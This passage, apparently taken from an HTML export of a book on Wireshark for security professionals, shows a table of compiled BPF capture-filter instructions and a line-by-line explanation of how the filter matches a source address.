0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.6000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jf</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=22  valign=top  style="width:13.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-left:0.7500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >4</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(002)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >ldh</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[6]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=66  valign=top  style="width:39.6000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=42  valign=top  style="width:25.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=22  valign=top  style="width:13.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(003)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jeq</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >#0x1</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=66  valign=top  style="width:39.6000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.6000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jt</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=42  valign=top  style="width:25.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.4500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >8</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.6000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jf</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=22  valign=top  style="width:13.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-left:0.7500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >4</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(004)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >ld</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[2]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=66  valign=top  style="width:39.6000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=42  valign=top  style="width:25.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=22  valign=top  style="width:13.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(005)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jeq</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >#0x2030405</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=66  valign=top  style="width:39.6000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.6000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jt</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=42  valign=top  style="width:25.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.4500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >6</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.6000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jf</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=22  valign=top  style="width:13.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-left:0.7500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >9</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(006)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >ldh</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[0]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=66  valign=top  style="width:39.6000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=42  valign=top  style="width:25.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=22  valign=top  style="width:13.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(007)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jeq</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >#0x1</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=66  valign=top  style="width:39.6000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.6000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jt</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=42  valign=top  style="width:25.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.4500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >8</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.6000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jf</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=22  valign=top  style="width:13.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-left:0.7500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >9</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(008)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >ret</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >#65535</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=66  valign=top  style="width:39.6000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=42  valign=top  style="width:25.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=22  valign=top  style="width:13.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(009)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >ret</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >#0</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=66  valign=top  style="width:39.6000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=42  valign=top  style="width:25.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=22  valign=top  style="width:13.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr></table><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As previously mentioned, using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-d</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >operator will show the BPF code for the capture filter. And, used in the example above, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-f </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >operator will show the libpcap filter syntax.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><a name="_bookmark34" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Following is a line-by-line explanation of the BPF:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker47825.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Line 0 loads the offset for the second part of the source address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section32" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:17.2500px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker47894.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Line 1 compares the packet at the offset to 2030405 and jumps to line 2 if it matches, or line 4 if it doesn&#8217;t match.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.5500pt;margin-right:13.0500pt;margin-left:30.5000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="position:absolute;z-index:1;left:0px;margin-left:133.0833px;margin-top:23.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker48013.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lines 2 and 3 load the offset for the first part of the source address and compare it to 0001. If this also matches, it can return 65535</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to capture this</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.6667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker48175.png" ></span><span 